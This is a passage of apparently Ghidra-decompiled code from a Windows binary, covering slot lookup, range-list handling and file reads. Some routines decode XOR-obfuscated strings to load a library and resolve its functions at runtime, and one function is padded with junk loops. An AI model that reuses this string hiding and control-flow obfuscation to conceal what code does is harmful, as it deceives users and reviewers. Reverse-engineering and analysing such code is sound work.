      pbVar6 = pbVar6 + 4;
    }
    uVar1 = FUN_0040faa0(local_44,param_3);
    bVar7 = false;
    bVar10 = false;
    sVar2 = (short)CONCAT31(extraout_var,uVar1);
    bVar9 = sVar2 < 0;
    bVar8 = sVar2 == 0;
    if (bVar8) {
      uVar3 = FUN_004103d0(param_2);
      bVar7 = (undefined1 *)0xfffffff7 < &stack0xffffffa8;
      bVar10 = SCARRY4((int)&stack0xffffffa8,8);
      bVar9 = (int)&stack0xffffffb0 < 0;
      bVar8 = &stack0x00000000 == (undefined1 *)0x50;
      do {
        if (!bVar7) break;
      } while (!bVar7);
      do {
        if (!bVar8 && -9 < (int)&stack0xffffffa8) break;
      } while (!bVar8 && -9 < (int)&stack0xffffffa8);
      do {
        if (!bVar7) break;
      } while (!bVar7);
      do {
        if (!bVar8 && -9 < (int)&stack0xffffffa8) break;
      } while (!bVar8 && -9 < (int)&stack0xffffffa8);
      do {
        if (!bVar7) break;
      } while (!bVar7);
      do {
        if (!bVar8 && -9 < (int)&stack0xffffffa8) break;
      } while (!bVar8 && -9 < (int)&stack0xffffffa8);
      do {
        if (!bVar7) break;
      } while (!bVar7);
      do {
        if (!bVar8 && -9 < (int)&stack0xffffffa8) break;
      } while (!bVar8 && -9 < (int)&stack0xffffffa8);
      do {
        if (!bVar7) break;
      } while (!bVar7);
      do {
        if (!bVar8 && -9 < (int)&stack0xffffffa8) break;
      } while (!bVar8 && -9 < (int)&stack0xffffffa8);
      do {
        if (!bVar7) break;
      } while (!bVar7);
      do {
        if (!bVar8 && -9 < (int)&stack0xffffffa8) break;
      } while (!bVar8 && -9 < (int)&stack0xffffffa8);
      do {
        if (!bVar7) break;
      } while (!bVar7);
    }
    else {
      do {
        if (0 < sVar2) break;
      } while (0 < sVar2);
      do {
        if (0 < sVar2) break;
      } while (0 < sVar2);
      do {
        if (0 < sVar2) break;
      } while (0 < sVar2);
      do {
        if (0 < sVar2) break;
      } while (0 < sVar2);
      do {
        if (0 < sVar2) break;
      } while (0 < sVar2);
      do {
        if (0 < sVar2) break;
      } while (0 < sVar2);
      do {
        if (0 < sVar2) break;
      } while (0 < sVar2);
      pbVar5 = local_44;
      for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {
        *(undefined4 *)param_2 = *(undefined4 *)pbVar5;
        pbVar5 = pbVar5 + 4;
        param_2 = param_2 + 4;
      }
      uVar3 = 1;
    }
    do {
      if (!bVar7) break;
    } while (!bVar7);
    do {
      if (!bVar8 && bVar10 == bVar9) break;
    } while (!bVar8 && bVar10 == bVar9);
    do {
      if (!bVar7) break;
    } while (!bVar7);
    do {
      if (!bVar8 && bVar10 == bVar9) break;
    } while (!bVar8 && bVar10 == bVar9);
    do {
      if (!bVar7) break;
    } while (!bVar7);
    do {
      if (!bVar8 && bVar10 == bVar9) break;
    } while (!bVar8 && bVar10 == bVar9);
    do {
      if (!bVar7) break;
    } while (!bVar7);
    do {
      if (!bVar8 && bVar10 == bVar9) break;
    } while (!bVar8 && bVar10 == bVar9);
    do {
      if (!bVar7) break;
    } while (!bVar7);
    do {
      if (!bVar8 && bVar10 == bVar9) break;
    } while (!bVar8 && bVar10 == bVar9);
    do {
      if (!bVar7) break;
    } while (!bVar7);
    do {
      if (!bVar8 && bVar10 == bVar9) break;
    } while (!bVar8 && bVar10 == bVar9);
    do {
      if (!bVar7) break;
    } while (!bVar7);
    do {
      if (!bVar8 && bVar10 == bVar9) break;
    } while (!bVar8 && bVar10 == bVar9);
    do {
      if (!bVar7) break;
    } while (!bVar7);
    do {
      if (!bVar8 && bVar10 == bVar9) break;
    } while (!bVar8 && bVar10 == bVar9);
    do {
      if (!bVar7) break;
    } while (!bVar7);
    do {
      if (!bVar8 && bVar10 == bVar9) break;
    } while (!bVar8 && bVar10 == bVar9);
    do {
      if (!bVar7) break;
    } while (!bVar7);
    do {
      if (!bVar8 && bVar10 == bVar9) break;
    } while (!bVar8 && bVar10 == bVar9);
    do {
      if (!bVar7) break;
    } while (!bVar7);
    do {
      if (!bVar8 && bVar10 == bVar9) break;
    } while (!bVar8 && bVar10 == bVar9);
    do {
      if (!bVar7) break;
    } while (!bVar7);
    do {
      if (!bVar8 && bVar10 == bVar9) break;
    } while (!bVar8 && bVar10 == bVar9);
    do {
      if (!bVar7) break;
    } while (!bVar7);
    do {
      if (!bVar8 && bVar10 == bVar9) break;
    } while (!bVar8 && bVar10 == bVar9);
    do {
      if (!bVar7) break;
    } while (!bVar7);
    do {
      if (!bVar8 && bVar10 == bVar9) break;
    } while (!bVar8 && bVar10 == bVar9);
    do {
      if (!bVar7) break;
    } while (!bVar7);
    do {
      if (!bVar8 && bVar10 == bVar9) break;
    } while (!bVar8 && bVar10 == bVar9);
    do {
      if (!bVar7) break;
    } while (!bVar7);
    do {
      if (!bVar8 && bVar10 == bVar9) break;
    } while (!bVar8 && bVar10 == bVar9);
    do {
      if (!bVar7) break;
    } while (!bVar7);
    do {
      if (!bVar8 && bVar10 == bVar9) break;
    } while (!bVar8 && bVar10 == bVar9);
    do {
      if (!bVar7) break;
    } while (!bVar7);
    do {
      if (!bVar8 && bVar10 == bVar9) break;
    } while (!bVar8 && bVar10 == bVar9);
    do {
      if (!bVar7) break;
    } while (!bVar7);
    do {
      if (!bVar8 && bVar10 == bVar9) break;
    } while (!bVar8 && bVar10 == bVar9);
    do {
      if (!bVar7) break;
    } while (!bVar7);
  }
  else if (param_1 == 1) {
    uVar1 = FUN_0040faa0(param_2,param_3);
    uVar3 = (undefined2)CONCAT31(extraout_var_00,uVar1);
  }
  else if (param_1 == 2) {
    uVar3 = FUN_004103d0(param_2);
  }
  else {
    uVar3 = (undefined2)param_3;
  }
  return CONCAT22((short)((uint)*(undefined4 *)(local_44 + (unaff_retaddr >> 0x1f) * -0x10 + -0x10)
                         >> 0x10),uVar3);
}



/* VA 00411910 */

short __cdecl FUN_00411910(char *param_1)

{
  short *psVar1;

  psVar1 = FUN_00411c30(param_1);
  if (psVar1 != (short *)0x0) {
    return psVar1[8];
  }
  return 0;
}



/* VA 00411930 */

void __cdecl FUN_00411930(char *param_1,uint param_2,int param_3,uint param_4)

{
  int *piVar1;
  short *psVar2;
  undefined4 uVar3;

  psVar2 = FUN_00411c30(param_1);
  if (psVar2 != (short *)0x0) {
    piVar1 = *(int **)(psVar2 + param_4 * 2 + 10);
    FUN_00413480(piVar1,param_2);
    uVar3 = FUN_00412d60(piVar1,param_2,param_3,param_4);
    if ((short)uVar3 == 0) {
      uVar3 = FUN_00412d90(piVar1,param_2,param_3,param_4);
      if ((short)uVar3 == 0) {
        FUN_00412df0(piVar1,param_2,param_3,param_4);
      }
    }
  }
  return;
}



/* VA 004119a0 */

uint __cdecl FUN_004119a0(char *param_1,uint *param_2,uint *param_3,uint param_4,short param_5)

{
  uint uVar1;
  uint in_EAX;
  short *psVar2;
  uint uVar3;

  if (((param_2 != (uint *)0x0) && (param_3 != (uint *)0x0)) &&
     (in_EAX = *param_2, in_EAX < *param_3)) {
    psVar2 = FUN_00411c30(param_1);
    in_EAX = 0;
    if (psVar2 != (short *)0x0) {
      uVar3 = *param_2;
      uVar1 = *param_3;
      if ((uVar3 != 0) && ((uVar3 & 0xfff) == 0)) {
        uVar3 = uVar3 - 1;
      }
      if (((uVar3 < *(uint *)(psVar2 + 0x1a)) || (*(uint *)(psVar2 + 0x1c) < uVar1)) ||
         (((uVar3 ^ *(uint *)(psVar2 + 0x1a)) & 0xfffff000) != 0)) {
        if (DAT_0042e9e4 != 0) {
          if (param_5 == 0) {
            FUN_004135d0((char *)(psVar2 + 2));
          }
          else {
            FUN_004135e0((char *)(psVar2 + 2),uVar3,uVar1);
          }
          DAT_0042e9e4 = 0;
        }
        if (param_5 != 0) {
          FUN_004134c0((char *)(psVar2 + 2),*(uint *)(psVar2 + 0x36),*(undefined4 **)(psVar2 + 0x38)
                       ,uVar3,uVar1,1);
          DAT_0042e9e4 = 1;
        }
        *(uint *)(psVar2 + 0x1a) = uVar3;
        *(uint *)(psVar2 + 0x1c) = uVar1;
      }
      uVar3 = FUN_004133e0((undefined4 *)(psVar2 + 10),param_2,param_3,param_4);
      return uVar3;
    }
  }
  return in_EAX & 0xffff0000;
}



/* VA 00411aa0 */

void __cdecl FUN_00411aa0(char *param_1,int param_2)

{
  short *psVar1;

  psVar1 = FUN_00411c30(param_1);
  if (psVar1 != (short *)0x0) {
    FUN_00413050(*(int **)(psVar1 + param_2 * 2 + 10));
  }
  return;
}



/* VA 00411ad0 */

void __cdecl FUN_00411ad0(char *param_1,int param_2,uint param_3,uint param_4)

{
  short *psVar1;

  psVar1 = FUN_00411c30(param_1);
  if (psVar1 != (short *)0x0) {
    FUN_004130c0(*(int **)(psVar1 + param_2 * 2 + 10),param_3,param_4);
  }
  return;
}



/* VA 00411b00 */

undefined4 __cdecl FUN_00411b00(char *param_1)

{
  short *psVar1;

  psVar1 = FUN_00411c30(param_1);
  if (psVar1 != (short *)0x0) {
    return *(undefined4 *)(psVar1 + 0x62);
  }
  return 0;
}



/* VA 00411b20 */

undefined4 __cdecl FUN_00411b20(char *param_1,undefined4 param_2)

{
  short *psVar1;

  psVar1 = FUN_00411c30(param_1);
  if (psVar1 != (short *)0x0) {
    *(undefined4 *)(psVar1 + 0x62) = param_2;
    return CONCAT22((short)((uint)psVar1 >> 0x10),1);
  }
  return 0;
}



/* VA 00411b50 */

undefined4 __cdecl FUN_00411b50(char *param_1)

{
  short *psVar1;

  psVar1 = FUN_00411c30(param_1);
  if (psVar1 != (short *)0x0) {
    return *(undefined4 *)(psVar1 + 100);
  }
  return 0;
}



/* VA 00411b70 */

undefined4 __cdecl FUN_00411b70(char *param_1,undefined4 param_2)

{
  short *psVar1;

  psVar1 = FUN_00411c30(param_1);
  if (psVar1 != (short *)0x0) {
    *(undefined4 *)(psVar1 + 100) = param_2;
    return CONCAT22((short)((uint)psVar1 >> 0x10),1);
  }
  return 0;
}



/* VA 00411c30 */

short * __cdecl FUN_00411c30(char *param_1)

{
  short *psVar1;
  int iVar2;
  short *psVar3;
  char *pcVar4;
  bool bVar5;

  psVar1 = &DAT_0042e5e8;
  do {
    if (*psVar1 == 1) {
      iVar2 = 0xc;
      bVar5 = true;
      psVar3 = psVar1 + 2;
      pcVar4 = param_1;
      do {
        if (iVar2 == 0) break;
        iVar2 = iVar2 + -1;
        bVar5 = (char)*psVar3 == *pcVar4;
        psVar3 = (short *)((int)psVar3 + 1);
        pcVar4 = pcVar4 + 1;
      } while (bVar5);
      if (bVar5) {
        return psVar1;
      }
    }
    psVar1 = psVar1 + 0x66;
    if (&DAT_0042e9e4 <= psVar1) {
      return (short *)0x0;
    }
  } while( true );
}



/* VA 00411c70 */

void __cdecl FUN_00411c70(int param_1,undefined4 param_2)

{
  *(undefined4 *)(param_1 + 8) = param_2;
  return;
}



/* VA 00411c80 */

undefined4 __cdecl FUN_00411c80(undefined4 *param_1,LONG param_2,undefined4 *param_3,LPVOID param_4)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  uint in_EAX;

  puVar1 = param_1;
  if (param_1[2] == 0x65) {
    in_EAX = SetFilePointer((HANDLE)*param_1,param_2,(PLONG)0x0,0);
    puVar2 = param_3;
    if (in_EAX != 0xffffffff) {
      in_EAX = ReadFile((HANDLE)*puVar1,param_4,(DWORD)param_3,(LPDWORD)&param_1,(LPOVERLAPPED)0x0);
      if (((short)in_EAX != 0) && (param_1 == puVar2)) {
        return CONCAT22((short)(in_EAX >> 0x10),1);
      }
    }
  }
  return in_EAX & 0xffff0000;
}



/* VA 00411d40 */

uint __cdecl FUN_00411d40(undefined4 *param_1,int param_2,uint param_3,undefined4 *param_4)

{
  int iVar1;
  DWORD DVar2;
  uint uVar3;
  undefined4 *puVar4;
  uint unaff_EDI;

  uVar3 = param_3;
  if (param_1[2] == 0x67) {
    puVar4 = (undefined4 *)(param_1[1] + param_2);
    for (uVar3 = param_3 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
      *param_4 = *puVar4;
      puVar4 = puVar4 + 1;
      param_4 = param_4 + 1;
    }
    for (uVar3 = param_3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
      *(undefined1 *)param_4 = *(undefined1 *)puVar4;
      puVar4 = (undefined4 *)((int)puVar4 + 1);
      param_4 = (undefined4 *)((int)param_4 + 1);
    }
    return CONCAT22((short)(param_3 >> 0x10),1);
  }
  if (param_1[2] != 0x66) {
    return (uint)param_1 & 0xffff0000;
  }
  iVar1 = (*DAT_0042e9f0)(*param_1,param_1[1] + param_2,param_4,param_3,&param_3);
  if ((iVar1 == 0) || (unaff_EDI != uVar3)) {
    if (iVar1 == 0) {
      if (unaff_EDI == uVar3) {
        DVar2 = GetLastError();
        return DVar2 & 0xffff0000;
      }
      if (unaff_EDI != uVar3) {
        DVar2 = GetLastError();
        return DVar2 & 0xffff0000;
      }
    }
    else if (unaff_EDI != uVar3) {
      DVar2 = GetLastError();
      return DVar2 & 0xffff0000;
    }
  }
  return CONCAT22((short)((uint)iVar1 >> 0x10),1);
}



/* VA 00411eb0 */

uint __cdecl FUN_00411eb0(undefined4 *param_1,int param_2,undefined4 *param_3,undefined4 *param_4)

{
  ushort uVar1;
  uint in_EAX;
  undefined2 extraout_var;
  undefined4 uVar2;

  if (param_1[2] == 100) {
    return in_EAX & 0xffff0000;
  }
  if (DAT_0042e9f4 != 1) {
    uVar1 = FUN_00411f10();
    if (uVar1 == 0) {
      return CONCAT22(extraout_var,uVar1);
    }
  }
  if (param_1[2] != 0x65) {
    uVar2 = FUN_00411d40(param_1,param_2,(uint)param_3,param_4);
    return uVar2;
  }
  uVar2 = FUN_00411c80(param_1,param_2,param_3,param_4);
  return uVar2;
}



/* VA 00411f10 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

ushort FUN_00411f10(void)

{
  HMODULE pHVar1;
  ushort uVar2;

  if (DAT_0042e9f4 == 1) {
    return 1;
  }
  pHVar1 = FUN_00411f90(&DAT_0042a978);
  if (pHVar1 != (HMODULE)0x0) {
    DAT_0042e9f0 = FUN_00412050(pHVar1,&DAT_0042a988);
    uVar2 = (ushort)(DAT_0042e9f0 != (FARPROC)0x0);
    _DAT_0042e9ec = FUN_00412050(pHVar1,&DAT_0042a9a0);
    if (_DAT_0042e9ec == (FARPROC)0x0) {
      uVar2 = 0;
    }
    _DAT_0042e9e8 = FUN_00412050(pHVar1,&DAT_0042a9b8);
    if (_DAT_0042e9e8 != (FARPROC)0x0) {
      DAT_0042e9f4 = uVar2;
      return uVar2;
    }
  }
  DAT_0042e9f4 = 0;
  return 0;
}



/* VA 00411f90 */

HMODULE __cdecl FUN_00411f90(char *param_1)

{
  char *lpLibFileName;
  HMODULE pHVar1;

  pHVar1 = (HMODULE)0x0;
  if (param_1 != (char *)0x0) {
    lpLibFileName = FUN_00411fd0(param_1);
    if (lpLibFileName != (char *)0x0) {
      pHVar1 = LoadLibraryA(lpLibFileName);
      FUN_00414d40(lpLibFileName);
    }
  }
  return pHVar1;
}



/* VA 00411fd0 */

char * __cdecl FUN_00411fd0(char *param_1)

{
  char cVar1;
  char *pcVar2;
  uint uVar3;

  uVar3 = 0xffffffff;
  pcVar2 = param_1;
  do {
    if (uVar3 == 0) break;
    uVar3 = uVar3 - 1;
    cVar1 = *pcVar2;
    pcVar2 = pcVar2 + 1;
  } while (cVar1 != '\0');
  pcVar2 = (char *)FUN_00414db0(~uVar3);
  if (pcVar2 != (char *)0x0) {
    FUN_00412010(pcVar2,param_1);
  }
  return pcVar2;
}



/* VA 00412010 */

char * __cdecl FUN_00412010(char *param_1,char *param_2)

{
  char *pcVar1;
  byte *pbVar2;
  int iVar3;
  int iVar4;

  iVar4 = 0;
  *param_1 = *param_2;
  if (*param_2 != '\0') {
    iVar3 = (int)param_1 - (int)param_2;
    do {
      pcVar1 = param_2 + 1;
      pbVar2 = (byte *)(param_2 + iVar3);
      iVar4 = iVar4 + 1;
      param_2 = param_2 + 1;
      param_2[iVar3] = *pbVar2 ^ *pcVar1 - 1U;
    } while (*param_2 != '\0');
  }
  param_1[iVar4] = '\0';
  return param_1;
}



/* VA 00412050 */

FARPROC __cdecl FUN_00412050(HMODULE param_1,char *param_2)

{
  char *lpProcName;
  FARPROC pFVar1;

  pFVar1 = (FARPROC)0x0;
  if (param_1 != (HMODULE)0x0) {
    lpProcName = FUN_00411fd0(param_2);
    if (lpProcName != (char *)0x0) {
      pFVar1 = GetProcAddress(param_1,lpProcName);
      FUN_00414d40(lpProcName);
    }
  }
  return pFVar1;
}



/* VA 00412cf0 */

int * __cdecl FUN_00412cf0(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  int *piVar1;
  int iVar2;

  piVar1 = (int *)FUN_00414db0(0xc);
  if (piVar1 != (int *)0x0) {
    piVar1[1] = 0;
    piVar1[2] = 0;
    iVar2 = FUN_00413760(param_1,param_2,param_3);
    if (iVar2 != 0) {
      *piVar1 = iVar2;
      return piVar1;
    }
    FUN_00414d40((undefined *)piVar1);
  }
  return (int *)0x0;
}



/* VA 00412d40 */

void __cdecl FUN_00412d40(undefined4 *param_1)

{
  FUN_00413790((undefined *)*param_1);
  FUN_00414d40((undefined *)param_1);
  return;
}



/* VA 00412d60 */

undefined4 __cdecl FUN_00412d60(int *param_1,uint param_2,int param_3,uint param_4)

{
  undefined4 *puVar1;

  puVar1 = FUN_00412fe0(param_1,param_2,param_3,param_4);
  if (puVar1 != (undefined4 *)0x0) {
    param_1[2] = (int)puVar1;
    return CONCAT22((short)((uint)puVar1 >> 0x10),1);
  }
  return 0;
}



/* VA 00412d90 */

undefined4 __cdecl FUN_00412d90(undefined4 *param_1,uint param_2,int param_3,int param_4)

{
  undefined4 *puVar1;
  undefined2 extraout_var;

  puVar1 = (undefined4 *)param_1[2];
  if (puVar1 == (undefined4 *)0x0) {
    puVar1 = (undefined4 *)*param_1;
  }
  puVar1 = FUN_00413150(puVar1,param_2,param_3,param_4);
  if (puVar1 != (undefined4 *)0x0) {
    FUN_004137a0((uint *)*puVar1,param_2,param_3);
    FUN_00412ee0((int)param_1,puVar1);
    param_1[2] = puVar1;
    return CONCAT22(extraout_var,1);
  }
  return 0;
}



/* VA 00412df0 */

undefined4 __cdecl
FUN_00412df0(undefined4 *param_1,uint param_2,undefined4 param_3,undefined4 param_4)

{
  undefined4 *puVar1;
  int *piVar2;
  undefined2 extraout_var;

  puVar1 = (undefined4 *)param_1[2];
  if (puVar1 == (undefined4 *)0x0) {
    puVar1 = (undefined4 *)*param_1;
  }
  puVar1 = FUN_00413110(puVar1,param_2);
  if (puVar1 != (undefined4 *)0x0) {
    piVar2 = FUN_00412cf0(param_2,param_3,param_4);
    FUN_00412e50((int)puVar1,piVar2);
    param_1[2] = puVar1[2];
    return CONCAT22(extraout_var,1);
  }
  return 0;
}



/* VA 00412e50 */

bool __cdecl FUN_00412e50(int param_1,undefined4 *param_2)

{
  int iVar1;

  if (param_2 != (undefined4 *)0x0) {
    param_2[1] = param_1;
    iVar1 = *(int *)(param_1 + 8);
    param_2[2] = iVar1;
    *(undefined4 **)(iVar1 + 4) = param_2;
    *(undefined4 **)(param_1 + 8) = param_2;
    FUN_00412e90(param_2);
  }
  return param_2 != (undefined4 *)0x0;
}



/* VA 00412e90 */

undefined4 __cdecl FUN_00412e90(undefined4 *param_1)

{
  short sVar1;
  undefined4 uVar2;

  uVar2 = 0;
  if (param_1 != (undefined4 *)0x0) {
    sVar1 = FUN_004139e0((uint *)*param_1,*(uint **)param_1[2]);
    if (sVar1 == 0) {
      sVar1 = FUN_004139e0((uint *)*param_1,*(uint **)param_1[1]);
      if (sVar1 == 0) {
        return 0;
      }
    }
    uVar2 = 1;
  }
  return uVar2;
}



/* VA 00412ee0 */

void __cdecl FUN_00412ee0(int param_1,undefined4 *param_2)

{
  bool bVar1;
  short sVar2;
  undefined4 uVar3;

  do {
    bVar1 = false;
    uVar3 = FUN_004139a0((int *)*param_2,*(int **)param_2[2]);
    if ((short)uVar3 == 0) {
      sVar2 = FUN_004139e0((uint *)*param_2,*(uint **)param_2[2]);
      if (sVar2 != 0) goto LAB_00412f19;
    }
    else {
LAB_00412f19:
      FUN_004137c0((uint *)*param_2,*(uint **)param_2[2]);
      FUN_00412fa0(param_1,(undefined4 *)param_2[2]);
      bVar1 = true;
    }
    uVar3 = FUN_004139a0((int *)*param_2,*(int **)param_2[1]);
    if ((short)uVar3 == 0) {
      sVar2 = FUN_004139e0((uint *)*param_2,*(uint **)param_2[1]);
      if (sVar2 != 0) goto LAB_00412f68;
    }
    else {
LAB_00412f68:
      FUN_004137c0((uint *)*param_2,*(uint **)param_2[1]);
      FUN_00412fa0(param_1,(undefined4 *)param_2[1]);
      bVar1 = true;
    }
    if (!bVar1) {
      return;
    }
  } while( true );
}



/* VA 00412fa0 */

void __cdecl FUN_00412fa0(int param_1,undefined4 *param_2)

{
  if (param_2 == *(undefined4 **)(param_1 + 8)) {
    *(undefined4 *)(param_1 + 8) = (*(undefined4 **)(param_1 + 8))[2];
  }
  if (param_2 == *(undefined4 **)(param_1 + 0xc)) {
    *(undefined4 *)(param_1 + 0xc) = (*(undefined4 **)(param_1 + 0xc))[2];
  }
  *(undefined4 *)(param_2[2] + 4) = param_2[1];
  *(undefined4 *)(param_2[1] + 8) = param_2[2];
  FUN_00412d40(param_2);
  return;
}



/* VA 00412fe0 */

undefined4 * __cdecl FUN_00412fe0(int *param_1,uint param_2,int param_3,uint param_4)

{
  bool bVar1;
  undefined3 extraout_var;
  uint uVar2;
  undefined4 *puVar3;

  puVar3 = (undefined4 *)param_1[2];
  if ((puVar3 != (undefined4 *)0x0) ||
     (puVar3 = (undefined4 *)*param_1, puVar3 != (undefined4 *)0x0)) {
    while (bVar1 = FUN_00413880((uint *)*puVar3,param_2), (short)CONCAT31(extraout_var,bVar1) == 0)
    {
      uVar2 = FUN_00413800((uint *)*puVar3,param_2,param_3,param_4);
      if ((short)uVar2 != 0) {
        FUN_00412ee0((int)param_1,puVar3);
        return puVar3;
      }
      puVar3 = (undefined4 *)puVar3[1];
      if (puVar3 == (undefined4 *)0x0) {
        return (undefined4 *)0x0;
      }
    }
  }
  return (undefined4 *)0x0;
}



/* VA 00413050 */

void __cdecl FUN_00413050(int *param_1)

{
  int iVar1;

  iVar1 = *(int *)(*param_1 + 4);
  if (iVar1 != param_1[1]) {
    do {
      iVar1 = *(int *)(iVar1 + 4);
      FUN_00412fa0((int)param_1,*(undefined4 **)(iVar1 + 8));
    } while (iVar1 != param_1[1]);
  }
  return;
}



/* VA 004130c0 */

void __cdecl FUN_004130c0(int *param_1,uint param_2,uint param_3)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 uVar3;

  puVar2 = *(undefined4 **)(*param_1 + 4);
  while (puVar2 != (undefined4 *)0x0) {
    if ((puVar2 == (undefined4 *)param_1[1]) ||
       (uVar3 = FUN_00413a00((uint *)*puVar2,param_2,param_3), (short)uVar3 != 0)) {
      puVar2 = (undefined4 *)puVar2[1];
    }
    else {
      puVar1 = (undefined4 *)puVar2[1];
      FUN_00412fa0((int)param_1,puVar2);
      puVar2 = puVar1;
    }
  }
  return;
}



/* VA 00413110 */

undefined4 * __cdecl FUN_00413110(undefined4 *param_1,uint param_2)

{
  bool bVar1;
  undefined3 extraout_var;

  if (param_1 == (undefined4 *)0x0) {
    return (undefined4 *)0x0;
  }
  do {
    bVar1 = FUN_00413880((uint *)*param_1,param_2);
    if ((short)CONCAT31(extraout_var,bVar1) != 0) {
      return param_1;
    }
    param_1 = (undefined4 *)param_1[1];
  } while (param_1 != (undefined4 *)0x0);
  return (undefined4 *)0x0;
}



/* VA 00413150 */

undefined4 * __cdecl FUN_00413150(undefined4 *param_1,uint param_2,int param_3,int param_4)

{
  bool bVar1;
  undefined4 uVar2;
  undefined3 extraout_var;

  if (param_1 != (undefined4 *)0x0) {
    while( true ) {
      uVar2 = FUN_00413960((int *)*param_1,param_2,param_3,param_4);
      if ((short)uVar2 != 0) {
        return param_1;
      }
      bVar1 = FUN_00413880((uint *)*param_1,param_2);
      if ((short)CONCAT31(extraout_var,bVar1) != 0) break;
      param_1 = (undefined4 *)param_1[1];
      if (param_1 == (undefined4 *)0x0) {
        return (undefined4 *)0x0;
      }
    }
  }
  return (undefined4 *)0x0;
}



/* VA 004131b0 */

uint __cdecl FUN_004131b0(undefined4 *param_1,uint *param_2,uint *param_3)

{
  undefined4 *puVar1;
  uint *puVar2;
  uint *puVar3;
  undefined4 *puVar4;
  uint uVar5;

  puVar2 = param_2;
  puVar1 = param_1;
  puVar4 = FUN_00413220(param_1,*param_2);
  puVar4 = FUN_00413110(puVar4,*puVar2);
  puVar3 = param_3;
  if (puVar4 == (undefined4 *)0x0) {
    return 0;
  }
  param_2 = (uint *)*puVar2;
  param_1 = (undefined4 *)*param_3;
  uVar5 = FUN_00413260(puVar4,(uint *)&param_2,(uint *)&param_1);
  if ((short)uVar5 == 1) {
    *puVar2 = (uint)param_2;
    *puVar3 = (uint)param_1;
    puVar1[3] = puVar4;
  }
  return uVar5;
}



/* VA 00413220 */

undefined4 * __cdecl FUN_00413220(undefined4 *param_1,uint param_2)

{
  uint uVar1;
  undefined4 *puVar2;

  puVar2 = (undefined4 *)param_1[3];
  if ((param_2 == 0) || (puVar2 == (undefined4 *)0x0)) {
    puVar2 = (undefined4 *)*param_1;
  }
  else {
    while( true ) {
      uVar1 = FUN_00413860((uint *)*puVar2,param_2);
      if ((short)uVar1 != 0) break;
      puVar2 = (undefined4 *)puVar2[2];
      if (puVar2 == (undefined4 *)0x0) {
        return (undefined4 *)0x0;
      }
    }
  }
  return puVar2;
}



/* VA 00413260 */

uint __cdecl FUN_00413260(undefined4 *param_1,uint *param_2,uint *param_3)

{
  short sVar1;
  uint in_EAX;
  uint uVar2;

  if (param_1 != (undefined4 *)0x0) {
    uVar2 = FUN_00413920(*(int **)param_1[2],*param_2);
    *param_2 = uVar2;
    uVar2 = FUN_00413890((uint *)*param_1,uVar2);
    sVar1 = (short)uVar2;
    while (sVar1 != 0) {
      uVar2 = FUN_004138d0((int *)*param_1);
      *param_2 = uVar2;
      param_1 = (undefined4 *)param_1[1];
      uVar2 = FUN_00413890((uint *)*param_1,uVar2);
      sVar1 = (short)uVar2;
    }
    uVar2 = FUN_00413940((int *)*param_1,*param_3);
    *param_3 = uVar2;
    return (uint)(*param_2 <= uVar2);
  }
  return in_EAX & 0xffff0000;
}



/* VA 004132e0 */

undefined4 __cdecl FUN_004132e0(undefined4 *param_1,uint *param_2,uint *param_3,uint param_4)

{
  int *piVar1;
  uint uVar2;

  piVar1 = FUN_00413220(param_1,*param_2);
  piVar1 = FUN_00413370(piVar1,*param_2,*param_3,param_4);
  uVar2 = 0;
  if (piVar1 != (int *)0x0) {
    uVar2 = FUN_00413a00((uint *)*piVar1,*param_2,*param_3);
    if ((short)uVar2 != 0) {
      uVar2 = FUN_004138e0((uint *)*piVar1,*param_2);
      *param_2 = uVar2;
      uVar2 = FUN_00413900((int *)*piVar1,*param_3);
      *param_3 = uVar2;
      param_1[3] = piVar1;
      return CONCAT22((short)(uVar2 >> 0x10),1);
    }
  }
  *param_2 = *param_3 - 1;
  return uVar2 & 0xffff0000;
}



/* VA 00413370 */

int * __cdecl FUN_00413370(int *param_1,uint param_2,uint param_3,uint param_4)

{
  bool bVar1;
  undefined4 uVar2;
  uint uVar3;
  undefined3 extraout_var;

  if (param_1 == (int *)0x0) {
    return (int *)0x0;
  }
  do {
    uVar2 = FUN_00413a00((uint *)*param_1,param_2,param_3);
    if ((short)uVar2 == 0) {
      bVar1 = FUN_00413880((uint *)*param_1,param_3);
      if ((short)CONCAT31(extraout_var,bVar1) != 0) {
        return (int *)0x0;
      }
    }
    else {
      uVar3 = FUN_004138b0(*param_1,param_4);
      if ((short)uVar3 != 0) {
        return param_1;
      }
    }
    param_1 = (int *)param_1[1];
  } while (param_1 != (int *)0x0);
  return (int *)0x0;
}



/* VA 004133e0 */

void __cdecl FUN_004133e0(undefined4 *param_1,uint *param_2,uint *param_3,uint param_4)

{
  uint *puVar1;
  uint uVar2;
  undefined4 uVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  undefined4 *puVar7;
  uint local_24;
  undefined4 local_20 [8];

  uVar2 = param_4;
  puVar1 = param_2;
  local_24 = *param_3;
  param_2 = (uint *)*param_2;
  puVar7 = local_20;
  for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar7 = *param_1;
    param_1 = param_1 + 1;
    puVar7 = puVar7 + 1;
  }
  uVar3 = FUN_004132e0((undefined4 *)local_20[param_4],(uint *)&param_2,&local_24,param_4);
  if (((short)uVar3 != 0) && (uVar2 != 3)) {
    uVar6 = 0;
    puVar7 = local_20;
    do {
      if (uVar2 != uVar6) {
        uVar4 = FUN_004131b0((undefined4 *)*puVar7,(uint *)&param_2,&local_24);
        if ((short)uVar4 == 0) break;
      }
      uVar6 = uVar6 + 1;
      puVar7 = puVar7 + 1;
    } while ((int)uVar6 < 8);
  }
  *puVar1 = (uint)param_2;
  *param_3 = local_24;
  return;
}



/* VA 00413480 */

void __cdecl FUN_00413480(undefined4 *param_1,uint param_2)

{
  uint uVar1;
  undefined4 *puVar2;

  if (param_1 != (undefined4 *)0x0) {
    puVar2 = (undefined4 *)param_1[2];
    if (puVar2 == (undefined4 *)0x0) {
      puVar2 = (undefined4 *)*param_1;
    }
    else {
      while (uVar1 = FUN_00413860((uint *)*puVar2,param_2), (short)uVar1 == 0) {
        puVar2 = (undefined4 *)puVar2[2];
        if (puVar2 == (undefined4 *)0x0) {
          param_1[2] = 0;
          return;
        }
      }
    }
    param_1[2] = puVar2;
  }
  return;
}



/* VA 004134c0 */
